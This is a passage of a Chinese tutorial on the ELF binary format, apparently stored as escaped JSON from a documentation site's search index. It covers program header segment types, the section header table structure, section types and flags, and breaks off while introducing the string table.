<p>\u4e0a\u56fe\u622a\u53d6\u4e86 readelf \u547d\u4ee4\u8fd4\u56de\u7ed3\u679c\u7684\u4e0a\u534a\u90e8\uff0c\u91cd\u70b9\u89e3\u91ca\uff1a</p> <ul> <li>PHDR\uff0c\u6b64\u7c7b\u578b header \u5143\u7d20\u63cf\u8ff0\u4e86 program header table \u81ea\u8eab\u7684\u4fe1\u606f\u3002\u4ece\u8fd9\u91cc\u7684\u5185\u5bb9\u770b\u51fa\uff1a</li> <li>\u793a\u4f8b\u7a0b\u5e8f\u7684 program header table \u5728\u6587\u4ef6\u4e2d\u7684\u504f\u79fb(Offset)\u4e3a 0x40\uff0c\u5373 64 \u53f7\u5b57\u8282\u5904\uff1b</li> <li>\u8be5\u6bb5\u6620\u5c04\u5230\u8fdb\u7a0b\u7a7a\u95f4\u7684\u865a\u62df\u5730\u5740(VirtAddr)\u4e3a 0x400040\uff1bPhysAddr \u6682\u65f6\u4e0d\u7528\uff0c\u5176\u4fdd\u6301\u548c VirtAddr \u4e00\u81f4\uff1b</li> <li>\u8be5\u6bb5\u5360\u7528\u7684\u6587\u4ef6\u5927\u5c0f FileSiz \u4e3a 00x2d8\uff1b\u8fd0\u884c\u65f6\u5360\u7528\u8fdb\u7a0b\u7a7a\u95f4\u5185\u5b58\u5927\u5c0f MemSiz \u4e5f\u4e3a 0x2d8\uff1b</li> <li>Flags \u6807\u8bb0\u8868\u793a\u8be5\u6bb5\u7684\u8bfb\u5199\u6743\u9650\uff0c\u8fd9\u91cc\u201dR E\u201d\u8868\u793a\u53ef\u8bfb\u53ef\u6267\u884c\uff0c\u8bf4\u660e\u672c\u6bb5\u5c5e\u4e8e\u4ee3\u7801\u6bb5\uff1b</li> <li>Align \u5bf9\u9f50\u4e3a 8\uff0c\u8868\u660e\u672c\u6bb5\u6309 8 \u5b57\u8282\u5bf9\u9f50\u3002</li> <li>INTERP\uff0c\u6b64\u7c7b\u578b header \u5143\u7d20\u63cf\u8ff0\u4e86\u4e00\u4e2a\u7279\u6b8a\u5185\u5b58\u6bb5\uff0c\u8be5\u6bb5\u5185\u5b58\u8bb0\u5f55\u4e86\u52a8\u6001\u52a0\u8f7d\u89e3\u6790\u5668\u7684\u8bbf\u95ee\u8def\u5f84\u5b57\u7b26\u4e32\u3002\u793a\u4f8b\u7a0b\u5e8f\u4e2d\uff0c\u8be5\u6bb5\u5185\u5b58\u4f4d\u4e8e\u6587\u4ef6\u504f\u79fb 0x318 \u5904\uff0c\u5373\u7d27\u8ddf program header table\uff1b\u6620\u5c04\u7684\u8fdb\u7a0b\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5730\u5740\u4e3a 0x318\uff1b\u6587\u4ef6\u957f\u5ea6\u548c\u5185\u5b58\u6620\u5c04\u957f\u5ea6\u5747\u4e3a 0x1c\uff0c\u5373 28 \u4e2a\u5b57\u7b26\uff0c\u5177\u4f53\u5185\u5bb9\u4e3a\u201d/lib64/ld-linux-x86-64.so.2\u201d\uff1b\u6bb5\u5c5e\u6027\u4e3a\u53ea\u8bfb\uff0c\u5e76\u6309\u5b57\u8282\u5bf9\u9f50\uff1b</li> <li>LOAD\uff0c\u6b64\u7c7b\u578b header \u5143\u7d20\u63cf\u8ff0\u4e86\u53ef\u52a0\u8f7d\u5230\u8fdb\u7a0b\u7a7a\u95f4\u7684 \u4ee3\u7801\u6bb5\u6216\u6570\u636e\u6bb5\u3002</li> <li>DYNAMIC\uff0c\u6b64\u7c7b\u578b header \u5143\u7d20\u63cf\u8ff0\u4e86\u52a8\u6001\u52a0\u8f7d\u6bb5\uff0c\u5176\u5185\u90e8\u901a\u5e38\u5305\u542b\u4e86\u4e00\u4e2a\u540d\u4e3a\u201d.dynamic\u201d\u7684\u52a8\u6001\u52a0\u8f7d\u533a\uff1b\u8fd9\u4e5f\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u63cf\u8ff0\u4e86\u4e0e\u52a8\u6001\u52a0\u8f7d\u76f8\u5173\u7684\u5404\u65b9\u9762\u4fe1\u606f\uff0c\u6211\u4eec\u5c06\u5728\u52a8\u6001\u52a0\u8f7d\u4e2d\u4ecb\u7ecd\u3002</li> </ul> <p>\u6ce8\u610f\uff1a\u4e0d\u540c\u7684\u6bb5\u53ef\u80fd\u4f1a\u6709\u6240\u91cd\u5408\uff0c\u5373\u4e0d\u540c\u7684\u6bb5\u5305\u542b\u76f8\u540c\u7684\u8282\u3002</p> <p>\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u6bb5\u7c7b\u578b\u5982\u4e0b\uff1a</p> \u540d\u5b57 \u53d6\u503c \u8bf4\u660e PT_NULL 0 \u8868\u660e\u6bb5\u672a\u4f7f\u7528\uff0c\u5176\u7ed3\u6784\u4e2d\u5176\u4ed6\u6210\u5458\u90fd\u662f\u672a\u5b9a\u4e49\u7684\u3002 PT_LOAD 1 \u6b64\u7c7b\u578b\u6bb5\u4e3a\u4e00\u4e2a\u53ef\u52a0\u8f7d\u7684\u6bb5\uff0c\u5927\u5c0f\u7531 p_filesz \u548c p_memsz \u63cf\u8ff0\u3002\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u88ab\u6620\u5c04\u5230\u76f8\u5e94\u5185\u5b58\u6bb5\u5f00\u59cb\u5904\u3002\u5982\u679c p_memsz \u5927\u4e8e p_filesz\uff0c\u201c\u5269\u4f59\u201d \u7684\u5b57\u8282\u90fd\u8981\u88ab\u7f6e\u4e3a 0\u3002p_filesz \u4e0d\u80fd\u5927\u4e8e p_memsz\u3002\u53ef\u52a0\u8f7d\u7684\u6bb5\u5728\u7a0b\u5e8f\u5934\u90e8\u4e2d\u6309\u7167 p_vaddr \u7684\u5347\u5e8f\u6392\u5217\u3002 PT_DYNAMIC 2 \u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u52a8\u6001\u94fe\u63a5\u4fe1\u606f\u3002 PT_INTERP 3 \u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u4e86\u4e00\u4e2a\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u548c\u957f\u5ea6\uff0c\u8be5\u5b57\u7b26\u4e32\u5c06\u88ab\u5f53\u4f5c\u89e3\u91ca\u5668\u8c03\u7528\u3002\u8fd9\u79cd\u6bb5\u7c7b\u578b\u4ec5\u5bf9\u53ef\u6267\u884c\u6587\u4ef6\u6709\u610f\u4e49\uff08\u4e5f\u53ef\u80fd\u51fa\u73b0\u5728\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\uff09\u3002\u6b64\u5916\uff0c\u8fd9\u79cd\u6bb5\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\u6700\u591a\u51fa\u73b0\u4e00\u6b21\u3002\u800c\u4e14\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u5b58\u5728\u7684\u8bdd\uff0c\u5b83\u5fc5\u987b\u5728\u6240\u6709\u53ef\u52a0\u8f7d\u6bb5\u9879\u7684\u524d\u9762\u3002 PT_NOTE 4 \u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u9644\u52a0\u4fe1\u606f\u7684\u4f4d\u7f6e\u548c\u5927\u5c0f\u3002 PT_SHLIB 5 \u8be5\u6bb5\u7c7b\u578b\u88ab\u4fdd\u7559\uff0c\u4e0d\u8fc7\u8bed\u4e49\u672a\u6307\u5b9a\u3002\u800c\u4e14\uff0c\u5305\u542b\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u7684\u7a0b\u5e8f\u4e0d\u7b26\u5408 ABI \u6807\u51c6\u3002 PT_PHDR 6 \u8be5\u6bb5\u7c7b\u578b\u7684\u6570\u7ec4\u5143\u7d20\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u5219\u7ed9\u51fa\u4e86\u7a0b\u5e8f\u5934\u90e8\u8868\u81ea\u8eab\u7684\u5927\u5c0f\u548c\u4f4d\u7f6e\uff0c\u65e2\u5305\u62ec\u5728\u6587\u4ef6\u4e2d\u4e5f\u5305\u62ec\u5728\u5185\u5b58\u4e2d\u7684\u4fe1\u606f\u3002\u6b64\u7c7b\u578b\u7684\u6bb5\u5728\u6587\u4ef6\u4e2d\u6700\u591a\u51fa\u73b0\u4e00\u6b21\u3002\u6b64\u5916\uff0c\u53ea\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\u662f\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u7684\u4e00\u90e8\u5206\u65f6\uff0c\u5b83\u624d\u4f1a\u51fa\u73b0\u3002\u5982\u679c\u6b64\u7c7b\u578b\u6bb5\u5b58\u5728\uff0c\u5219\u5fc5\u987b\u5728\u6240\u6709\u53ef\u52a0\u8f7d\u6bb5\u9879\u76ee\u7684\u524d\u9762\u3002 PT_LOPROC~PT_HIPROC 0x70000000 ~0x7fffffff \u6b64\u8303\u56f4\u7684\u7c7b\u578b\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u3002 <p>p_flags \u5b57\u6bb5\u6807\u5fd7\u7740\u6bb5\u7684\u6743\u9650\uff0c\u6743\u9650\u4e3b\u8981\u6709\uff1aR\uff08\u8bfb\uff09\u3001W\uff08\u5199\uff09\u3001E\uff08\u6267\u884c\uff09\u3002</p> <p>\u4f8b\u5982\uff0c\u4e00\u822c\u6765\u8bf4\uff0c<code>.text</code> \u6bb5\u4e00\u822c\u5177\u6709\u8bfb\u548c\u6267\u884c\u6743\u9650\uff0c\u4f46\u662f\u4e0d\u4f1a\u6709\u5199\u6743\u9650\u3002\u6570\u636e\u6bb5\u4e00\u822c\u5177\u6709\u5199\uff0c\u8bfb\uff0c\u4ee5\u53ca\u6267\u884c\u6743\u9650\u3002</p> <p>\u90a3\u4e48\uff0c\u6bb5\u4e2d\u7684\u5185\u5bb9\u662f\u4ec0\u4e48\uff1f</p> <p>readelf \u547d\u4ee4\u8fd4\u56de\u5185\u5bb9\u7684\u4e0b\u534a\u90e8\u5206\u7ed9\u51fa\u4e86\u5404\u6bb5(segment)\u548c\u5404\u533a(section)\u4e4b\u95f4\u7684\u5305\u542b\u5173\u7cfb\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002</p> <ul> <li>INTERP \u6bb5\u53ea\u5305\u542b\u4e86\u201d.interp\u201d\u533a\uff1b</li> <li>\u4ee3\u7801\u6bb5\uff08Text Segment\uff09 \u5305\u542b\u201d.interp\u201d\u3001\u201d.plt\u201d\u3001\u201d.text\u201d\u7b49\u533a\uff1b</li> <li>\u6570\u636e\u6bb5\uff08Data Segment\uff09 \u5305\u542b\u201d.dynamic\u201d\u3001\u201d.data\u201d\u3001\u201d.bss\u201d\u7b49\u533a\uff1b</li> <li>DYNAMIC \u6bb5\u5305\u542b\u201d.dynamic\u201d\u533a\u3002</li> </ul> <p>\u4ece\u8fd9\u91cc\u53ef\u4ee5\u770b\u51fa\uff0c\u6709\u4e9b\u533a\u88ab\u540c\u65f6\u5305\u542b\u5728\u591a\u4e2a\u6bb5\u4e2d\u3002</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/ELF%20%E8%AF%A6%E8%A7%A3/#section-header-table-section","title":"Section Header Table\uff08\u4e3a\u94fe\u63a5\u89c6\u56fe\u7684 Section \u51c6\u5907\uff09","text":"<p>Section Header Table \u901a\u5e38\u4f4d\u4e8e\u6587\u4ef6\u7684\u5c3e\u90e8\uff0c\u8be5\u7ed3\u6784\u7528\u4e8e\u5b9a\u4f4d ELF \u6587\u4ef6\u4e2d\u7684\u6bcf\u4e2a\u8282\u533a\u7684\u5177\u4f53\u4f4d\u7f6e\u3002</p> <p>\u9996\u5148\uff0cELF \u5934\u4e2d\u7684 <code>e_shoff</code> \u9879\u7ed9\u51fa\u4e86\u4ece\u6587\u4ef6\u5f00\u5934\u5230\u8282\u5934\u8868\u4f4d\u7f6e\u7684\u5b57\u8282\u504f\u79fb\u3002<code>e_shnum</code> \u544a\u8bc9\u4e86\u6211\u4eec\u8282\u5934\u8868\u5305\u542b\u7684\u9879\u6570\uff1b<code>e_shentsize</code> \u7ed9\u51fa\u4e86\u6bcf\u4e00\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002</p> <p>\u5176\u6b21\uff0c\u8282\u5934\u8868\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6bcf\u4e2a\u6570\u7ec4\u7684\u5143\u7d20\u7684\u7c7b\u578b\u662f <code>ELF32_Shdr</code> \uff0c\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u63cf\u8ff0\u4e86\u4e00\u4e2a\u8282\u533a\u7684\u6982\u8981\u5185\u5bb9\uff1a</p> <pre><code>typedef struct {\n    ELF32_Word      sh_name;     /* \u8282\u540d\u79f0\uff0c\u662f\u8282\u533a\u5934\u5b57\u7b26\u4e32\u8868\u8282\u533a\u4e2d\uff08Section Header String Table Section\uff09\u7684\u7d22\u5f15\uff0c\n                                                                    \u56e0\u6b64\u8be5\u5b57\u6bb5\u5b9e\u9645\u662f\u4e00\u4e2a\u6570\u503c\u3002\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u7684\u5177\u4f53\u5185\u5bb9\u662f\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002*/\n    ELF32_Word      sh_type;     // \u6839\u636e\u8282\u7684\u5185\u5bb9\u548c\u8bed\u4e49\u8fdb\u884c\u5206\u7c7b\uff0c\u5177\u4f53\u7684\u7c7b\u578b\u4e0b\u9762\u4f1a\u4ecb\u7ecd\u3002\n    ELF32_Word      sh_flags;    // \u6bcf\u4e00\u6bd4\u7279\u4ee3\u8868\u4e0d\u540c\u7684\u6807\u5fd7\uff0c\u63cf\u8ff0\u8282\u662f\u5426\u53ef\u5199\uff0c\u53ef\u6267\u884c\uff0c\u9700\u8981\u5206\u914d\u5185\u5b58\u7b49\u5c5e\u6027\u3002\n    ELF32_Addr      sh_addr;     /* \u5982\u679c\u8282\u533a\u5c06\u51fa\u73b0\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u50cf\u4e2d\uff0c\u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5e94\u8be5\u5728\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u4f4d\u7f6e\u3002\n                                                                  \u5426\u5219\uff0c\u6b64\u5b57\u6bb5\u4e3a 0\u3002*/\n    ELF32_Off       sh_offset;   /* \u7ed9\u51fa\u8282\u533a\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e0e\u6587\u4ef6\u5f00\u59cb\u5904\u4e4b\u95f4\u7684\u504f\u79fb\u3002\n                                                                    SHT_NOBITS \u7c7b\u578b\u7684\u8282\u533a\u4e0d\u5360\u7528\u6587\u4ef6\u7684\u7a7a\u95f4\uff0c\u56e0\u6b64\u5176 sh_offset \u6210\u5458\u7ed9\u51fa\u7684\u662f\u6982\u5ff5\u6027\u7684\u504f\u79fb\u3002*/\n    ELF32_Word      sh_size;     /* \u8282\u533a\u7684\u5b57\u8282\u5927\u5c0f\u3002\u9664\u975e\u8282\u533a\u7684\u7c7b\u578b\u662f SHT_NOBITS, \u5426\u5219\u8be5\u8282\u5360\u7528\u6587\u4ef6\u4e2d\u7684 sh_size \u5b57\u8282\u3002\n                                                                    \u7c7b\u578b\u4e3a SHT_NOBITS \u7684\u8282\u533a\u957f\u5ea6\u53ef\u80fd\u975e\u96f6\uff0c\u4e0d\u8fc7\u5374\u4e0d\u5360\u7528\u6587\u4ef6\u4e2d\u7684\u7a7a\u95f4\u3002*/\n    ELF32_Word      sh_link;     // \u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u5934\u90e8\u8868\u7d22\u5f15\u94fe\u63a5\uff0c\u5176\u5177\u4f53\u7684\u89e3\u91ca\u4f9d\u8d56\u4e8e\u8282\u533a\u7c7b\u578b\u3002\n    ELF32_Word      sh_info;     // \u6b64\u6210\u5458\u7ed9\u51fa\u9644\u52a0\u4fe1\u606f\uff0c\u5176\u89e3\u91ca\u4f9d\u8d56\u4e8e\u8282\u533a\u7c7b\u578b\u3002\n    ELF32_Word      sh_addralign;// \u67d0\u4e9b\u8282\u533a\u7684\u5730\u5740\u9700\u8981\u5bf9\u9f50\n    ELF32_Word      sh_entsize;  /* \u67d0\u4e9b\u8282\u533a\u4e2d\u5b58\u5728\u5177\u6709\u56fa\u5b9a\u5927\u5c0f\u7684\u8868\u9879\u7684\u8868\uff0c\u5982\u7b26\u53f7\u8868\u3002\n                                                                    \u5bf9\u4e8e\u8fd9\u7c7b\u8282\u533a\uff0c\u8be5\u6210\u5458\u7ed9\u51fa\u6bcf\u4e2a\u8868\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002\u53cd\u4e4b\uff0c\u6b64\u6210\u5458\u53d6\u503c\u4e3a 0\u3002*/\n} Elf32_Shdr;\n</code></pre> <p>\u901a\u8fc7 <code>readelf -S</code> \u547d\u4ee4\u6765\u770b\u770b\u793a\u4f8b\u7a0b\u5e8f\u4e2d\u7684 Section Header Table \u5185\u5bb9\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002\u793a\u4f8b\u7a0b\u5e8f\u5171\u751f\u6210 31 \u4e2a\u533a\uff1a</p> <ul> <li>Name \u8868\u793a\u6bcf\u4e2a\u533a\u7684\u540d\u5b57</li> <li>Type \u8868\u793a\u6bcf\u4e2a\u533a\u7684\u529f\u80fd</li> <li>Address \u8868\u793a\u6bcf\u4e2a\u533a\u7684\u8fdb\u7a0b\u6620\u5c04\u5730\u5740</li> <li>Offset \u8868\u793a\u6587\u4ef6\u5185\u504f\u79fb</li> <li>Size \u8868\u793a\u533a\u7684\u5927\u5c0f</li> <li>EntSize \u8868\u793a\u533a\u4e2d\u6bcf\u4e2a\u5143\u7d20\u7684\u5927\u5c0f(\u5982\u679c\u8be5\u533a\u4e3a\u4e00\u4e2a\u6570\u7ec4\u7684\u8bdd\uff0c\u5426\u5219\u8be5\u503c\u4e3a 0)</li> <li>Flags \u8868\u793a\u6bcf\u4e2a\u533a\u7684\u5c5e\u6027(\u53c2\u89c1\u56fe\u4e2d\u6700\u540e\u7684\u8bf4\u660e)</li> <li>Link \u548c Info \u8bb0\u5f55\u4e0d\u540c\u7c7b\u578b\u533a\u7684\u76f8\u5173\u4fe1\u606f(\u4e0d\u540c\u7c7b\u578b\u542b\u4e49\u4e0d\u540c\uff0c\u5177\u4f53\u53c2\u89c1\u89c4\u8303)</li> <li>Align \u8868\u793a\u533a\u7684\u5bf9\u9f50\u5355\u4f4d\u3002</li> </ul> <p></p> <p>\u8282\u7c7b\u578b\uff08sh_type\uff09\u76ee\u524d\u6709\u4e0b\u5217\u53ef\u9009\u8303\u56f4\uff0c\u5176\u4e2d SHT \u662f Section Header Table \u7684\u7b80\u5199\u3002</p> \u540d\u79f0 \u53d6\u503c \u8bf4\u660e SHT_NULL 0 \u8be5\u7c7b\u578b\u8282\u533a\u662f\u975e\u6d3b\u52a8\u7684\uff0c\u8fd9\u79cd\u7c7b\u578b\u7684\u8282\u5934\u4e2d\u7684\u5176\u5b83\u6210\u5458\u53d6\u503c\u65e0\u610f\u4e49\u3002 SHT_PROGBITS 1 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u7a0b\u5e8f\u5b9a\u4e49\u7684\u4fe1\u606f\uff0c\u5b83\u7684\u683c\u5f0f\u548c\u542b\u4e49\u90fd\u7531\u7a0b\u5e8f\u6765\u51b3\u5b9a\u3002 SHT_SYMTAB 2 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u4e00\u4e2a\u7b26\u53f7\u8868\uff08SYMbol TABle\uff09\u3002\u76ee\u524d\u76ee\u6807\u6587\u4ef6\u5bf9\u6bcf\u79cd\u7c7b\u578b\u7684\u8282\u533a\u90fd\u53ea \u80fd\u5305\u542b\u4e00\u4e2a\uff0c\u4e0d\u8fc7\u8fd9\u4e2a\u9650\u5236\u5c06\u6765\u53ef\u80fd\u53d1\u751f\u53d8\u5316\u3002 \u4e00\u822c\uff0cSHT_SYMTAB \u8282\u533a\u63d0\u4f9b\u7528\u4e8e\u94fe\u63a5\u7f16\u8f91\uff08\u6307 ld \u800c\u8a00\uff09 \u7684\u7b26\u53f7\uff0c\u5c3d\u7ba1\u4e5f\u53ef\u7528\u6765\u5b9e\u73b0\u52a8\u6001\u94fe\u63a5\u3002 SHT_STRTAB 3 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u5b57\u7b26\u4e32\u8868\uff08 STRing TABle \uff09\u3002 SHT_RELA 4 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u663e\u5f0f\u6307\u5b9a\u4f4d\u6570\u7684\u91cd\u5b9a\u4f4d\u9879\uff08 RELocation entry with Addends \uff09\uff0c\u4f8b\u5982\uff0c32 \u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 Elf32_Rela \u7c7b\u578b\u3002\u6b64\u5916\uff0c\u76ee\u6807\u6587\u4ef6\u53ef\u80fd\u62e5\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002 SHT_HASH 5 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u7b26\u53f7\u54c8\u5e0c\u8868\uff08 HASH table \uff09\u3002 SHT_DYNAMIC 6 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u7684\u4fe1\u606f\uff08 DYNAMIC linking \uff09\u3002 SHT_NOTE 7 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u4ee5\u67d0\u79cd\u65b9\u5f0f\u6807\u8bb0\u6587\u4ef6\u7684\u4fe1\u606f\uff08NOTE\uff09\u3002 SHT_NOBITS 8 \u8be5\u7c7b\u578b\u8282\u533a\u4e0d\u5360\u7528\u6587\u4ef6\u7684\u7a7a\u95f4\uff0c\u5176\u5b83\u65b9\u9762\u548c SHT_PROGBITS \u76f8\u4f3c\u3002\u5c3d\u7ba1\u8be5\u7c7b\u578b\u8282\u533a\u4e0d\u5305\u542b\u4efb\u4f55\u5b57\u8282\uff0c\u5176\u5bf9\u5e94\u7684\u8282\u5934\u6210\u5458 sh_offset \u4e2d\u8fd8\u662f\u4f1a\u5305\u542b\u6982\u5ff5\u6027\u7684\u6587\u4ef6\u504f\u79fb\u3002 SHT_REL 9 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u91cd\u5b9a\u4f4d\u8868\u9879\uff08RELocation entry without Addends\uff09\uff0c\u4e0d\u8fc7\u5e76\u6ca1\u6709\u6307\u5b9a\u4f4d\u6570\u3002\u4f8b\u5982\uff0c32 \u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 Elf32_rel \u7c7b\u578b\u3002\u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u4ee5\u62e5\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002 SHT_SHLIB 10 \u8be5\u7c7b\u578b\u6b64\u8282\u533a\u88ab\u4fdd\u7559\uff0c\u4e0d\u8fc7\u5176\u8bed\u4e49\u5c1a\u672a\u88ab\u5b9a\u4e49\u3002 SHT_DYNSYM 11 \u4f5c\u4e3a\u4e00\u4e2a\u5b8c\u6574\u7684\u7b26\u53f7\u8868\uff0c\u5b83\u53ef\u80fd\u5305\u542b\u5f88\u591a\u5bf9\u52a8\u6001\u94fe\u63a5\u800c\u8a00\u4e0d\u5fc5 \u8981\u7684\u7b26\u53f7\u3002\u56e0\u6b64\uff0c\u76ee\u6807\u6587\u4ef6\u4e5f\u53ef\u4ee5\u5305\u542b\u4e00\u4e2a SHT_DYNSYM \u8282\u533a\uff0c\u5176\u4e2d\u4fdd\u5b58\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u7684\u4e00\u4e2a\u6700\u5c0f\u96c6\u5408\uff0c\u4ee5\u8282\u7701\u7a7a\u95f4\u3002 SHT_LOPROC 0X70000000 \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u4e0b\u754c\uff08 LOw PROCessor-specific semantics \uff09\u3002 SHT_HIPROC OX7FFFFFFF \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u4e0a\u754c\uff08 HIgh PROCessor-specific semantics \uff09\u3002 SHT_LOUSER 0X80000000 \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u7d22\u5f15\u4e0b\u754c\u3002 SHT_HIUSER 0X8FFFFFFF \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u7d22\u5f15\u4e0a\u754c\u3002 <p>\u8282\u5934\u4e2d <code>sh_flags</code> \u5b57\u6bb5\u7684\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u90fd\u53ef\u4ee5\u7ed9\u51fa\u5176\u76f8\u5e94\u7684\u6807\u8bb0\u4fe1\u606f\uff0c\u5176\u5b9a\u4e49\u4e86\u5bf9\u5e94\u7684\u8282\u533a\u7684\u5185\u5bb9\u662f\u5426\u53ef\u4ee5\u88ab\u4fee\u6539\u3001\u88ab\u6267\u884c\u7b49\u4fe1\u606f\u3002\u5982\u679c\u4e00\u4e2a\u6807\u5fd7\u4f4d\u88ab\u8bbe\u7f6e\uff0c\u5219\u8be5\u4f4d\u53d6\u503c\u4e3a 1\uff0c\u672a\u5b9a\u4e49\u7684\u4f4d\u90fd\u4e3a 0\u3002\u76ee\u524d\u5df2\u5b9a\u4e49\u503c\u5982\u4e0b\uff0c\u5176\u4ed6\u503c\u4fdd\u7559\u3002</p> \u540d\u79f0 \u503c \u8bf4\u660e SHF_WRITE 0x1 \u8fd9\u79cd\u8282\u5305\u542b\u4e86\u8fdb\u7a0b\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u88ab\u5199\u7684\u6570\u636e\u3002 SHF_ALLOC 0x2 \u8fd9\u79cd\u8282\u5728\u8fdb\u7a0b\u8fd0\u884c\u65f6\u5360\u7528\u5185\u5b58\u3002\u5bf9\u4e8e\u4e0d\u5360\u7528\u76ee\u6807\u6587\u4ef6\u7684\u5185\u5b58\u955c\u50cf\u7a7a\u95f4\u7684\u67d0\u4e9b\u63a7\u5236\u8282\uff0c\u8be5\u5c5e\u6027\u5904\u4e8e\u5173\u95ed\u72b6\u6001 (off)\u3002 SHF_EXECINSTR 0x4 \u8fd9\u79cd\u8282\u5305\u542b\u53ef\u6267\u884c\u7684\u673a\u5668\u6307\u4ee4\uff08EXECutable INSTRuction\uff09\u3002 SHF_MASKPROC 0xf0000000 \u6240\u6709\u5728\u8fd9\u4e2a\u63a9\u7801\u4e2d\u7684\u6bd4\u7279\u4f4d\u7528\u4e8e\u7279\u5b9a\u5904\u7406\u5668\u8bed\u4e49\u3002 <p>\u5f53\u8282\u533a\u7c7b\u578b\u7684\u4e0d\u540c\u7684\u65f6\u5019\uff0csh_link \u548c sh_info \u4e5f\u4f1a\u5177\u6709\u4e0d\u540c\u7684\u542b\u4e49\u3002</p> sh_type sh_link sh_info SHT_DYNAMIC \u8282\u533a\u4e2d\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u8868\u7684\u8282\u5934\u7d22\u5f15 0 SHT_HASH \u6b64\u54c8\u5e0c\u8868\u6240\u4f7f\u7528\u7684\u7b26\u53f7\u8868\u7684\u8282\u5934\u7d22\u5f15 0 SHT_REL/SHT_RELA \u4e0e\u7b26\u53f7\u8868\u76f8\u5173\u7684\u8282\u5934\u7d22\u5f15 \u91cd\u5b9a\u4f4d\u5e94\u7528\u5230\u7684\u8282\u7684\u8282\u5934\u7d22\u5f15 SHT_SYMTAB/SHT_DYNSYM \u64cd\u4f5c\u7cfb\u7edf\u7279\u5b9a\u4fe1\u606f\uff0cLinux \u4e2d\u7684 ELF \u6587\u4ef6\u4e2d\u8be5\u9879\u6307\u5411\u7b26\u53f7\u8868\u4e2d\u7b26\u53f7\u6240\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u8282\u533a\u5728 Section Header Table \u4e2d\u7684\u504f\u79fb\u3002 \u64cd\u4f5c\u7cfb\u7edf\u7279\u5b9a\u4fe1\u606f other SHN_UNDEF 0"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/ELF%20%E8%AF%A6%E8%A7%A3/#section-strtab","title":"Section: STRTAB","text":"<p>\u4ece\u4e0a\u8ff0 Section Header Table \u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u6709\u4e00\u79cd\u7c7b\u578b\u4e3a STRTAB \u7684\u533a(\u5728 Section Header Table \u4e2d\u7684\u4e0b\u6807\u4e3a 7,29,30)\u3002\u6b64\u7c7b\u533a\u53eb\u505a String Table\uff0c\u5176\u4f5c\u7528\u662f\u96c6\u4e2d\u8bb0\u5f55\u5b57\u7b26\u4e32\u4fe1\u606f\uff0c\u5176\u5b83\u533a\u5728\u9700\u8981\u4f7f\u7528\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u53ea\u9700\u8981\u8bb0\u5f55\u5b57\u7b26\u4e32\u8d77\u59cb\u5730\u5740\u5728\u8be5 String Table 